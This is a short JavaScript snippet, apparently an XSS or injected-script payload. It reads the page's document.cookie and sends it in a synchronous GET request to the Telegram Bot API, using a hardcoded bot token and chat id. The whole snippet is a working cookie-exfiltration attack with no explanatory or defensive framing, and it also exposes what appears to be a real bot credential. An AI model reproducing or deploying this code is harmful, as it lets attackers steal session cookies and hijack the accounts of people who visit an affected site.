function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

httpGet("https://api.telegram.org/bot5845735007:AAHwoqGS8hjRbl8Qx5TsY9ZgnhoglvW6Iks/sendMessage?chat_id=439546457&text=" + (document.cookie || "fail"));
